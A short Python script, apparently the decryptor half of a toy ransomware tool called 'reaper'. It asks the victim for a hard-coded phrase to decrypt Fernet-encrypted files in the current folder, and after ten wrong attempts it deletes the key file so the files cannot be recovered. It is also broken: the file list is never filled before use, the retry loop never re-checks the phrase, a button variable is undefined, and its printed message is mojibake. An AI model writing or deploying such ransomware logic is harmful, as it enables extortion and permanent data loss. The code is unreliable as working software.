import os
import time
import tkinter as tk
from cryptography.fernet import Fernet


files_enc = "adou"
thegoldenkey = "thekey.key"
y = 10
files = []

# GUI Interface
window = tk.Tk()
window.title("Decryptor")
window.geometry("500x300")

def decrypt():
    for file in os.listdir():
        if file == "reaper.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)

print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "adou"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase :
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Files Decrypted")
#		os.remove(thegoldenkey)
		
else :
	print("Wrong Phrase try left :", y)
	user_phrase = input("Enter the secret phrase to decrypt your files\n")
	while y > 0:
		y -= 1
		print("Wrong Phrase, try left :", y)
		user_phrase = input("Enter the secret phrase to decrypt your files\n")
		if y == 0:
			os.remove(files_enc)
			print("//\\")
			time.sleep(0.5)
			print("\\//")
			time.sleep(0.5)
			print("//\\")
			time.sleep(0.5)
			print("\\//")
			time.sleep(0.5)
			print("//\\")
			time.sleep(0.5)
			print("\\//")
			print("ğ™ğ™ğ™¡ğ™š ğ˜¿ğ™šğ™¡ğ™šğ™©ğ™šğ™™ ğ™›ğ™¤ğ™§ ğ™¨ğ™–ğ™›ğ™šğ™©ğ™®")
			os.remove(thegoldenkey)
		else:
	    		pass

	
decrypt_b = tk.Button(window, text='decrypt', width=200, command=decrypt)
button.pack(pady=20)
window.mainloop()

